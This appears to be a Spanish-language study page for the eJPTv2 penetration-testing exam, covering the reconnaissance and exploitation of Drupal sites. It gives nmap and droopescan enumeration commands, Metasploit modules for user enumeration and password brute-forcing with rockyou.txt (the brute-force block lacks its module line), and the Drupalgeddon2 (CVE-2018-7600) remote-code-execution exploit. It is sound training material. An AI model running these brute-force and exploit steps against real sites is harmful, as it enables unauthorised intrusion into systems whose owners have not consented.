---
layout: default
title: Preparación EJPTv2
---

# Drupal

Un sistema de gestión de contenidos (CMS por sus siglas en inglés) es una herramienta de software que permite a los usuarios añadir, publicar, editar o eliminar contenido desde un sitio web, utilizando un navegador web en un smartphone, tablet u ordenador personal. Habitualmente un software CMS se escribe en un lenguaje de programación que se ejecuta en un ordenador, donde se instalan un servidor web y una base de datos. El contenido y las opciones de configuración del sitio web normalmente se guardan en la base de datos, y por cada petición de página que recibe el servidor web, el sistema combina la información de la base de datos y los recursos (archivos JavaScript, CSS, imágenes, etc. que son parte del CMS o que han sido añadidos) para construir la página solicitada del sitio web.

## 🕵️ Identificación de la versión de Drupal y sus componentes.

```bash
nmap -sV --script http-drupal-enum <url> # Detección de versión de Drupal y módulos.
nmap -sV --script "http-drupal* and not http-drupal-brute" <url> # Escaneo de vulnerabilidades en Drupal.
nmap -sV --script http-drupal-users <url> # Detección de usuarios de Drupal.
nmap --script=http-drupal-enum --script-args http-drupal-enum.root=/ -p 80,443 <URL> # Escaneo completo para confirmar si se está utilizando Drupal.
nmap --script=http-vuln* -p 80,443 <url> # Detectar vulnerabilidades específicas en Drupal y sus módulos.
```

Antes de realizar cualquier escaneo del CMS Drupal, es recomendable revisar ciertos directorios específicos.

- CHANGELOG.txt

Si el servicio web no carga correctamente o parece inaccesible, podríamos estar ante un caso de virtual hosting. En ese caso, debemos agregar el dominio correspondiente en nuestro /etc/hosts, añadiendo la IP de la web y el dominio al que queremos apuntar, por ejemplo: 10.0.0.10 drupal.htb.

## 🛠️ Escaneo básico Drupal con Metasploit.

```bash
use auxiliary/scanner/http/drupal_version # Cargar módulo que vamos a utilizar.
set RHOSTS <url>
set RPORT 80
set TARGETURI /
run
```

## 🕵️ Enumerar Usuarios de Drupal

```bash
use auxiliary/scanner/http/drupal_users_enum
set RHOSTS <url>
set RPORT 80
set TARGETURI /
run
```

## 🔑 Ataque de fuerza bruta con Metasploit:

```bash
set RHOSTS <url>
set USERNAME <nombre_usuario> # Aquí le indicamos el nombre de usuario contra el que queramos atentar.
set PASS_FILE /usr/share/wordlists/rockyou.txt # Seleccionamos el diccionario a utilizar.
run
```

 💡 ¡IMPORTANTE! : 

El exploit Drupalgeddon2 (CVE-2018-7600) afecta a las siguientes versiones de Drupal:

- Drupal 6.x (todas las versiones)

- Drupal 7.x (todas las versiones antes de 7.58)

- Drupal 8.x (todas las versiones antes de 8.5.1).

## 🛠️ Ejecución del exploit Drupalgeddon2 con Metasploit.

Drupalgeddon2 es una vulnerabilidad crítica (CVE-2018-7600) que permite la ejecución remota de código en versiones vulnerables de Drupal.

```bash
use exploit/unix/webapp/drupal_drupalgeddon2 # Seleccionamos el exploit a utilizar.
set RHOSTS <url> # Le indicamos la url del objetivo.
set RPORT 80
set TARGETURI /
run # Iniciamos el ataque.
```

Este exploit aprovecha una ejecución arbitraria de código a través de la manipulación de formularios en Drupal.

---

## 🛠️ Otras herramientas para auditar Drupal.

### Droopescan

Droopescan es una herramienta especializada en la enumeración y auditoría de sitios web basados en Drupal. Permite detectar vulnerabilidades, enumerar usuarios, módulos y temas instalados.

```bash
droopescan scan drupal -u <url_drupal> # Análisis básico del sitio Drupal.
droopescan scan drupal -u <url_drupal> -e plugins, themes # Enumerar módulos y temas instalados.
```

